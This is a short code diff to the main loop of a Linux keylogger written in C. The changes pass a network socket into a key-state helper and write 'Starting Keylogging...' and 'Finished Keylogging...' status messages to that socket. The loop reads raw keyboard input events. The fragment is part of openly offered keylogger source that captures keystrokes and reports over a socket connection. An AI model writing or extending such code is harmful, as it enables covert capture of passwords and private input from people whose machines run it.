@@ -59,9 +59,10 @@ void					keylogger_loop(int keybd, int **key_table, int socket)
 
 	for (int i = 0; i < NR_LOCK; i++)
 		lockers[i] = 0;
-	lockers[6] = get_keystate(1); // capslock state
+	lockers[6] = get_keystate(1, socket); // capslock state
 //	lockers[?] = get_keystate(2); // numlock state
 	loop = 1;
+	write(socket, "Starting Keylogging...\n", 24);
 	while (loop > 0)
 	{
 		nbread = read(keybd, events, sizeof(struct input_event) * 128);
@@ -72,4 +73,5 @@ void					keylogger_loop(int keybd, int **key_table, int socket)
 			}
 		}
 	}
+	write(socket, "Finished Keylogging...\n", 24);
 }
